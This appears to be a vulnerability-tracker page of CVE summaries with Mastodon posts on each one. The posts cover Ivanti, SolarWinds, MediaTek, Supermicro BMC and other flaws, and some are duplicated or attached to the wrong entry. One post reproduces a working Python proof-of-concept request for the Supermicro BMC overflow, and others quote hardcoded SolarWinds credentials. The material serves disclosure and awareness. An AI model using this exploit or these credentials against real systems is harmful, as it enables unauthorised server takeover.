##
decio at 2024-09-21T10:00:13.337Z ##

#cve_2024_20017 recap
⬇️
"Affected chipsets: MT6890, MT7915, MT7916, MT7981, MT7986, MT7622
⬇️
Affected software: SDK version 7.4.0.1 and before (for MT7915) / SDK version 7.6.7.0 and before (for MT7916, MT7981 and MT7986)"
⬇️
""4 exploits, 1 bug: exploiting cve-2024-20017 4 different ways"
👇
https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html
⬇️
[PoC]
👇
https://github.com/mellow-hype/cve-2024-20017/tree/main
⬇️
"Critical Exploit in MediaTek Wi-Fi Chipsets: Zero-Click Vulnerability (CVE-2024-20017) Threatens Routers and Smartphones"
👇
https://blog.sonicwall.com/en-us/2024/09/critical-exploit-in-mediatek-wi-fi-chipsets-zero-click-vulnerability-cve-2024-20017-threatens-routers-and-smartphones/

[#Mediatek advisory]

"In wlan service, there is a possible out of bounds write due to improper input validation. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation"
⬇️
"March 2024 Product Security Bulletin"
👇
https://corp.mediatek.com/product-security-bulletin/March-2024

[#Ubiquity statement]

"Ubiquiti is NOT affected. We don't have any product that uses the vulnerable code."
👇
https://community.ui.com/questions/CVE-2024-20017/b3f1a425-d7cc-4fce-9218-c930ce4fa35f

##

CVE-2024-42259
(5.5 MEDIUM)

EPSS: 0.04%

updated 2024-09-25T01:15:42.137000

2 posts

In the Linux kernel, the following vulnerability has been resolved: drm/i915/gem: Fix Virtual Memory mapping boundaries calculation Calculating the size of the mapped area as the lesser value between the requested size and the actual size does not consider the partial mapping offset. This can cause page fault access. Fix the calculation of the starting and ending addresses, the total size is no

1 repos

#search_error

jann at 2024-09-23T15:01:25.837Z ##

back in 2013, @sima published a i915/GEM Crashcourse explaining the Linux kernel i915 GPU driver; I read that earlier this year, and it was really helpful for understanding what is going on in the i915 code and understanding the context of CVE-2024-42259.

I think without that explainer, it would have taken me a long time to understand what GTT MMIO mappings are. The idea that some physical address region owned by the GPU proxies physical memory accesses based on GPU page tables is pretty mindblowing...

##
jann@infosec.exchange at 2024-09-23T15:01:25.000Z ##

back in 2013, @sima published a i915/GEM Crashcourse explaining the Linux kernel i915 GPU driver; I read that earlier this year, and it was really helpful for understanding what is going on in the i915 code and understanding the context of CVE-2024-42259.

I think without that explainer, it would have taken me a long time to understand what GTT MMIO mappings are. The idea that some physical address region owned by the GPU proxies physical memory accesses based on GPU page tables is pretty mindblowing...

  • CVE-2024-38221 (4.3 medium) Microsoft Edge (Chromium-based) Spoofing Vulnerability
  • CVE-2024-43489 (6.5 medium) Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability
  • CVE-2024-43496 (6.5 medium) Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability

Not exploited, not publicly disclosed, exploitation less likely. MSRC also patched against the six CVEs (8904-8909) from Google Chrome's Patch Tuesday blog post.

jos1264@social.skynetcloud.site at 2024-09-20T22:45:02.000Z ##

Versa Networks Releases Advisory for a Vulnerability in Versa Director, CVE-2024-45229 https://www.cisa.gov/news-events/alerts/2024/09/20/versa-networks-releases-advisory-vulnerability-versa-director-cve-2024-45229

##
screaminggoat@infosec.exchange at 2024-09-20T21:55:27.000Z ##

CISA: Versa Networks Releases Advisory for a Vulnerability in Versa Director, CVE-2024-45229
CVE-2024-45229 (6.6 medium, disclosed today) sensitive information disclosure? in Versa Director, see security advisory

The Versa Director offers REST APIs for orchestration and management. By design, certain APIs, such as the login screen, banner display, and device registration, do not require authentication. However, it was discovered that for Directors directly connected to the Internet, one of these APIs can be exploited by injecting invalid arguments into a GET request, potentially exposing the authentication tokens of other currently logged-in users. These tokens can then be used to invoke additional APIs on port 9183. This exploit does not disclose any username or password information.

Versa Networks is not aware of this exploitation in any production systems. A proof of concept exists in the lab environment.

While this is not as serious as it appears, it's an alert from CISA after business hours on a Friday night. Last time, CISA added a fucking Versa Director vulnerability to the KEV Catalog after business hours on a Friday night. Then we come to find out that the Chinese state-sponsored APT Volt Typhoon was exploiting it as a zero-day.

#CVE_2024_45229 #VersaDirector #vulnerability #CVE

##

CVE-2024-22399
(9.8 CRITICAL)

EPSS: 0.18%

updated 2024-09-20T16:37:49.803000

1 posts

Deserialization of Untrusted Data vulnerability in Apache Seata.  When developers disable authentication on the Seata-Server and do not use the Seata client SDK dependencies, they may construct uncontrolled serialized malicious requests by directly sending bytecode based on the Seata private protocol. This issue affects Apache Seata: 2.0.0, from 1.0.0 through 1.8.0. Users are recommended to upg

CVE-2024-8963
(9.1 CRITICAL)

EPSS: 30.99%

updated 2024-09-20T16:32:02.563000

5 posts

Path Traversal in the Ivanti CSA before 4.6 Patch 519 allows a remote unauthenticated attacker to access restricted functionality.

1 repos

#search_error

screaminggoat@infosec.exchange at 2024-09-19T18:32:43.000Z ##

CISA: Ivanti Releases Admin Bypass Security Update for Cloud Services Appliance
Wow, CISA actually wrote a useful cybersecurity alert. Instead of just saying "Ivanti released a security update, go look at the vendor's advisory," this actually states that the vendor noted limited exploitation of CVE-2024-8963, and that when chained with CVE-2024-8190, an attacker can take control of an affected system. CISA also mentions that CVE-2024-8963 in the KEV Catalog now.

#CVE_2024_8190 #CVE_2024_8963 #Ivanti #zeroday #activeexploitation #cve #vulnerability #CISA #KEV #knownexploitedvulnerabilitiescatalog

##
cisakevtracker@mastodon.social at 2024-09-19T18:00:47.000Z ##

CVE ID: CVE-2024-8963
Vendor: Ivanti
Product: Cloud Services Appliance (CSA)
Date Added: 2024-09-19
Vulnerability: Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability
Notes: https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-4-6-Cloud-Services-Appliance-CVE-2024-8963 ; https://nvd.nist.gov/vuln/detail/CVE-2024-8963
CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2024-8963

##
screaminggoat@infosec.exchange at 2024-09-19T17:08:42.000Z ##

CISA: CISA Adds One Known Exploited Vulnerability to Catalog (link updated)
HOT OFF THE PRESS! CVE-2024-8963 Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability.

#cisa #kev #knownexploitedvulnerability #zeroday #vulnerability #CVE_2024_8963 #activeexploitation #eitw #ivanti #ivanticsa

##
screaminggoat@infosec.exchange at 2024-09-19T16:26:12.000Z ##

Ivanti exploited zero-day: Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)
CVE-2024-8963 (9.4 critical) Path Traversal in the Ivanti CSA before 4.6 Patch 519 allows a remote unauthenticated attacker to access restricted functionality.

This was originally reported at least 8 hours ago but Ivanti deleted their blog post and the security advisory required logging in. See parent toot above. Now the information is public.

According to the security advisory, it was chained with CVE-2024-8190 (7.2 high, disclosed 10 September 2024 by Ivanti, added to CISA KEV Catalog 13 September 2024) Ivanti Cloud Services Appliance OS command injection vulnerability so "an attacker can bypass admin authentication and execute arbitrary commands on the appliance."

#Ivanti #vulnerability #ivanticsa #cve #CVE_2024_8963 #zeroday #eitw #activeexploitation

##
screaminggoat@infosec.exchange at 2024-09-19T11:09:20.000Z ##

Ivanti originally published a blog post Cloud Service Appliance 4.6 Security Update which updated the RSS feed. However, they deleted it. 🤔

From what I can infer from the blog post, the vulnerability is an exploited zero-day in Ivanti Cloud Service Appliance 4.6, "which was incidentally resolved in the patch released 10 September." The URL for the now loginwall'ed security advisory shows that the CVE ID is CVE-2024-8963. CVE.org, MITRE and NVD have varying responses for that number from Reserved by CNA to CVE Not Found.

  • We are aware of a limited number of customers who have been exploited by this vulnerability.
  • This vulnerability does not impact any other Ivanti products or solutions.
  • Ivanti CSA 4.6 is end-of-life and Ivanti strongly recommends that customers transition to Ivanti CSA 5.0 as it is supported and is not affected by this vulnerability.

cc: @campuscodi @goatyell

#Ivanti #vulnerability #ivanticsa #cve #CVE_2024_8963

Additional Microsoft security advisories:

  • CVE-2024-38221 (4.3 medium) Microsoft Edge (Chromium-based) Spoofing Vulnerability
  • CVE-2024-43489 (6.5 medium) Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability
  • CVE-2024-43496 (6.5 medium) Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability

Not exploited, not publicly disclosed, exploitation less likely. MSRC also patched against the six CVEs (8904-8909) from Google Chrome's Patch Tuesday blog post.

#Microsoft #Edge #Chromium #chrome #vulnerability #CVE

##

CVE-2021-35232
(6.1 MEDIUM)

EPSS: 0.04%

updated 2024-09-17T04:16:51.820000

2 posts

Hard coded credentials discovered in SolarWinds Web Help Desk product. Through these credentials, the attacker with local access to the Web Help Desk host machine allows to execute arbitrary HQL queries against the database and leverage the vulnerability to steal the password hashes of the users or insert arbitrary data into the database.

screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##
screaminggoat@infosec.exchange at 2024-09-25T11:47:09.000Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

CVE-2024-8190
(7.2 HIGH)

EPSS: 15.12%

updated 2024-09-10T21:31:40

2 posts

An OS command injection vulnerability in Ivanti Cloud Services Appliance versions 4.6 Patch 518 and before allows a remote authenticated attacker to obtain remote code execution. The attacker must have admin level privileges to exploit this vulnerability.

1 repos

#search_error

screaminggoat@infosec.exchange at 2024-09-19T18:32:43.000Z ##

CISA: Ivanti Releases Admin Bypass Security Update for Cloud Services Appliance
Wow, CISA actually wrote a useful cybersecurity alert. Instead of just saying "Ivanti released a security update, go look at the vendor's advisory," this actually states that the vendor noted limited exploitation of CVE-2024-8963, and that when chained with CVE-2024-8190, an attacker can take control of an affected system. CISA also mentions that CVE-2024-8963 in the KEV Catalog now.

#CVE_2024_8190 #CVE_2024_8963 #Ivanti #zeroday #activeexploitation #cve #vulnerability #CISA #KEV #knownexploitedvulnerabilitiescatalog

##
screaminggoat@infosec.exchange at 2024-09-19T16:26:12.000Z ##

Ivanti exploited zero-day: Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)
CVE-2024-8963 (9.4 critical) Path Traversal in the Ivanti CSA before 4.6 Patch 519 allows a remote unauthenticated attacker to access restricted functionality.

This was originally reported at least 8 hours ago but Ivanti deleted their blog post and the security advisory required logging in. See parent toot above. Now the information is public.

According to the security advisory, it was chained with CVE-2024-8190 (7.2 high, disclosed 10 September 2024 by Ivanti, added to CISA KEV Catalog 13 September 2024) Ivanti Cloud Services Appliance OS command injection vulnerability so "an attacker can bypass admin authentication and execute arbitrary commands on the appliance."

#Ivanti #vulnerability #ivanticsa #cve #CVE_2024_8963 #zeroday #eitw #activeexploitation

##

CVE-2024-43491
(9.8 CRITICAL)

EPSS: 0.14%

updated 2024-09-10T18:30:54

10 posts

Microsoft is aware of a vulnerability in Servicing Stack that has rolled back the fixes for some vulnerabilities affecting Optional Components on Windows 10, version 1507 (initial version released July 2015). This means that an attacker could exploit these previously mitigated vulnerabilities on Windows 10, version 1507 (Windows 10 Enterprise 2015 LTSB and Windows 10 IoT Enterprise 2015 LTSB) syst

screaminggoat at 2024-09-26T17:13:40.330Z ##

CISA quietly removed CVE-2024-43491 (9.8 critical, disclosed 10 September 2024 by Microsoft) Microsoft Windows Update Remote Code Execution Vulnerability from the Known Exploited Vulnerabilities (KEV) Catalog. This is because Microsoft includes the verbiage in their Frequently Asked Questions (FAQ) section: "Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected."

So on the one hand, they marked it as exploited, but they clarified that the vulnerability itself wasn't exploited. Excelsior!

cc: @campuscodi

#CISA #knownexploitedvulnerabilitiescatalog #KEV #CVE_2024_43491 #microsoft #vulnerability #zeroday #eitw #activeexploitation

##
screaminggoat@infosec.exchange at 2024-09-26T17:13:40.000Z ##

CISA quietly removed CVE-2024-43491 (9.8 critical, disclosed 10 September 2024 by Microsoft) Microsoft Windows Update Remote Code Execution Vulnerability from the Known Exploited Vulnerabilities (KEV) Catalog. This is because Microsoft includes the verbiage in their Frequently Asked Questions (FAQ) section: "Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected."

So on the one hand, they marked it as exploited, but they clarified that the vulnerability itself wasn't exploited. Excelsior!

cc: @campuscodi

#CISA #knownexploitedvulnerabilitiescatalog #KEV #CVE_2024_43491 #microsoft #vulnerability #zeroday #eitw #activeexploitation

##
screaminggoat at 2024-10-02T14:28:30.747Z ##

@habr CVE-2024-43491 is technically not an exploited zero-day. The vulnerability was triggered which led to exploitation of other known vulnerabilities instead. CISA removed CVE-2024-43491 from the KEV Catalog based on that clarification.

##
screaminggoat at 2024-09-26T17:26:42.288Z ##

@cR0w @campuscodi

Starting with the Windows security update released March 12, 2024 - KB5035858 (OS Build 10240.20526), the build version numbers crossed into a range that triggered a code defect in the Windows 10 (version 1507) servicing stack that handles the applicability of Optional Components. As a result, any Optional Component that was serviced with updates released since March 12, 2024 (KB5035858) was detected as "not applicable" by the servicing stack and was reverted to its RTM version.

This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected.
In addition, the Windows product team at Microsoft discovered this issue, and we have seen no evidence that it is publicly known.

The CVE-2024-43491 vulnerability caused systems to be vulnerable to older known bugs that did get exploited, hence the "exploited" flag. I don't have the exact details, but Microsoft provided CISA with a list of known exploited vulnerabilities right before Patch Tuesday, and when CISA found out that this wasn't really exploited, they reached out to Microsoft for clarification.

##
cedric@fosstodon.org at 2024-09-26T06:02:10.000Z ##

@adulau actually it started very low:

$ curl -s 'https://api.first.org/data/v1/epss?cve=cve-2024-43491&scope=time-series' | jq '.data[0]."time-series"[-1]'
{
"epss": "0.00712000",
"percentile": "0.80862000",
"date": "2024-09-11"
}

As a result, any Optional Component that was serviced with updates released since March 12, 2024 (KB5035858) was detected as "not applicable" by the servicing stack and was reverted to its RTM version.

This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected.

The CVE-2024-43491 vulnerability caused systems to be vulnerable to older known bugs that did get exploited, hence the "exploited" flag. I don't have the exact details, but Microsoft provided CISA with a list of known exploited vulnerabilities right before Patch Tuesday, and when CISA found out that this wasn't really exploited, they reached out to Microsoft for clarification.

pentesttools at 2024-09-27T12:39:54.320Z ##

jos1264@social.skynetcloud.site at 2024-09-25T15:15:03.000Z ##

PoC for critical SolarWinds Web Help Desk vulnerability released (CVE-2024-28987) https://www.helpnetsecurity.com/2024/09/25/cve-2024-28987-poc/ #vulnerability #Horizon3.ai #enterprise #government #SolarWinds #Don'tmiss #education #Hotstuff #News #SMBs #CVE #MSP #PoC

##
screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##
jos1264@social.skynetcloud.site at 2024-09-25T15:15:03.000Z ##

PoC for critical SolarWinds Web Help Desk vulnerability released (CVE-2024-28987) https://www.helpnetsecurity.com/2024/09/25/cve-2024-28987-poc/ #vulnerability #Horizon3.ai #enterprise #government #SolarWinds #Don'tmiss #education #Hotstuff #News #SMBs #CVE #MSP #PoC

updated 2024-08-19T13:00:23.117000

1 posts

Flatpak is a Linux application sandboxing and distribution framework. Prior to versions 1.14.0 and 1.15.10, a malicious or compromised Flatpak app using persistent directories could access and write files outside of what it would otherwise have access to, which is an attack on integrity and confidentiality. When `persistent=subdir` is used in the application permissions (represented as `--persist

screaminggoat at 2024-09-22T18:27:46.904Z ##

@ntkramer Can you haphazard a guess as to why there's a sudden uptick of exploitation attempts? I don't know if if CVE-2023-4966 #CitrixBleed is automatable.

CVE-2023-4966 is known to be used in ransomware campaigns: Lockbit reported 21 November 2023: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a

Additional resources:

  • security advisory: https://support.citrix.com/s/article/CTX579459-netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967?language=en_US
  • Netscaler recommendations: https://www.netscaler.com/blog/news/netscaler-investigation-recommendations-for-cve-2023-4966/
  • Mandiant investigation includes Yara rule: https://cloud.google.com/blog/topics/threat-intelligence/session-hijacking-citrix-cve-2023-4966/
  • Unit 42 threat brief: https://unit42.paloaltonetworks.com/threat-brief-cve-2023-4966-netscaler-citrix-bleed/

RARLAB WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive. The issue occurs because a ZIP archive may include a benign file (such as an ordinary .JPG file) and also a folder that has the same name as the benign file, and the contents of the folder (which may include executable content) are processed during an attempt to acc

screaminggoat at 2024-09-25T13:54:00.393Z ##

Cloudflare: Unraveling SloppyLemming’s Operations Across South Asia
Reference: CVE-2023-38831 (7.8 high, disclosed 23 August 2023 by Group-IB as an exploited zero-day, added to CISA's KEV Catalog 24 August 2023, has proof of concept) RARLAB WinRAR Code Execution Vulnerability

Cloudflare reports that an APT dubbed SloppyLemming (aka India-nexus Outrider Tiger) used multiple cloud service providers between late 2022 to present for ongoing cyber espionage operations targeting Pakistan, Sri Lanka, Bangladesh, and China. Industries targeted include government, law enforcement, energy, telecommunications, and technology entities. SloppyLemming displays a lack of operational security (OPSEC) allowing Cloudforce One insight into its tooling. The actor primarily targets Pakistani government, defense, telecommunications, technology, and energy sector organizations; SloppyLemming also targets Bangladesh, Sri Lanka, Nepal, and China.

Cloudflare describes SloppyLemming, that their phishing activity focuses on credential and token collection. They describe malware operations (which leverages CVE-2023-38831) and a separate infection chain. While Cloudflare helpfully provides PowerShell hunting scripts, Microsoft Sentinel rule, and a Splunk script, they put the indicators of compromise (including SHA256 hashes) into an IMAGE! If Cloudflare had their own threat actor name, it’d be SloppyCTI.

See related Security Week reporting: India-Linked Hackers Targeting Pakistani Government, Law Enforcement

#threatintel #SloppyLemming #OutriderTiger #IOC #CTI #cyberthreatintelligence #infosec #CVE_2023_38831 #vulnerability #eitw #cyberespionage #India #cybersecurity

##
screaminggoat@infosec.exchange at 2024-09-25T13:54:00.000Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

jos1264@social.skynetcloud.site at 2024-09-27T02:00:02.000Z ##

Ivanti Virtual Traffic Manager (vTM ) Authentication Bypass Vulnerability (CVE-2024-7593) https://fortiguard.fortinet.com/threat-signal-report/5551

##
flagthis@botsin.space at 2024-09-25T18:23:21.000Z ##

## Ivanti vTM Flaw Under Active Attack: Patch Now! 🚨

This critical vulnerability allows attackers to bypass authentication and gain admin access. Affected versions include 22.2, 22.3, 22.3R2, 22.5R1, 22.6R1, and 22.7R1. #Cybersecurity #Vulnerability #Ivanti #vTM

https://securityonline.info/cisa-warns-of-actively-exploited-ivanti-vtm-flaw-cve-2024-7593-cvss-9-8-poc-published/

https://www.flagthis.com/?pid=4154

jbhall56 at 2024-09-25T12:18:48.701Z ##

Tracked as CVE-2024-7593, this auth bypass flaw is caused by an incorrect implementation of an authentication algorithm that lets remote unauthenticated attackers circumvent authentication on Internet-exposed vTM admin panels. https://www.bleepingcomputer.com/news/security/critical-ivanti-vtm-auth-bypass-bug-now-exploited-in-attacks/

##

CVE-2024-5445
(3.8 LOW)

EPSS: 0.04%

updated 2024-08-12T15:31:01

2 posts

Ecosystem Agent version 4 < 4.5.1.2597 and Ecosystem Agent version 5 < 5.1.4.2473 did not properly validate SSL/TLS certificates, which could allow a malicious actor to perform a Man-in-the-Middle and intercept traffic between the agent and N-able servers from a privileged network position.

harrysintonen at 2024-09-30T10:13:50.168Z ##

Disclosing details of a #vulnerability I discovered 1 year ago:

N-able Ecosystem Agent Improper Certificate Validation #CVE_2024_5445 vulnerability leads to #RCE as SYSTEM user.

Vulnerability details: https://sintonen.fi/advisories/n-able-ecosystem-agent-improper-certificate-validation.txt

N-able has rated this vulnerability CVSS 3.8, but the practical impact of this vulnerability is grave as it allows attackers in privileged network position to fully compromise vulnerable systems. While arguing for such low score N-able presentative stated that: "The vulnerability reported does not constitute an RCE, the Ecosystem agent is designed to run installation packages in a privileged context and the agent is doing what it should do when it receives such packages to install over the APIs."

I think this is somewhat disingenuous.

#infosec #cybersecurity

##
harrysintonen@infosec.exchange at 2024-09-30T10:13:50.000Z ##

Disclosing details of a #vulnerability I discovered 1 year ago:

N-able Ecosystem Agent Improper Certificate Validation #CVE_2024_5445 vulnerability leads to #RCE as SYSTEM user.

Vulnerability details: https://sintonen.fi/advisories/n-able-ecosystem-agent-improper-certificate-validation.txt

N-able has rated this vulnerability CVSS 3.8, but the practical impact of this vulnerability is grave as it allows attackers in privileged network position to fully compromise vulnerable systems. While arguing for such low score N-able presentative stated that: "The vulnerability reported does not constitute an RCE, the Ecosystem agent is designed to run installation packages in a privileged context and the agent is doing what it should do when it receives such packages to install over the APIs."

I think this is somewhat disingenuous.

#infosec #cybersecurity

CVE-2024-7490
(9.8 CRITICAL)

EPSS: 0.09%

updated 2024-08-12T15:30:49

3 posts

Improper Input Validation vulnerability in Microchip Techology Advanced Software Framework example DHCP server can cause remote code execution through a buffer overflow. This vulnerability is associated with program files tinydhcpserver.C and program routines lwip_dhcp_find_option. This issue affects Advanced Software Framework: through 3.52.0.2574.

CVE-2024-3833
(8.8 HIGH)

EPSS: 0.04%

updated 2024-08-01T15:32:46

2 posts

Object corruption in WebAssembly in Google Chrome prior to 124.0.6367.60 allowed a remote attacker to potentially exploit object corruption via a crafted HTML page. (Chromium security severity: High)

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##
hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##

CVE-2024-36435
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-08-01T13:52:50.527000

3 posts

An issue was discovered on Supermicro BMC firmware in select X11, X12, H12, B12, X13, H13, and B13 motherboards (and CMM6 modules). An unauthenticated user can post crafted data to the interface that triggers a stack buffer overflow, and may lead to arbitrary remote code execution on a BMC.

LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##
Tinolle at 2024-09-27T19:12:25.667Z ##

CVE-2024-36435 Deep-Dive: The Year’s Most Critical BMC Security Flaw
https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##
LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

CVE-2017-10271
(7.5 HIGH)

EPSS: 97.18%

updated 2024-07-24T18:32:16

4 posts

Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of

Nuclei template

screaminggoat at 2024-09-30T13:44:03.611Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
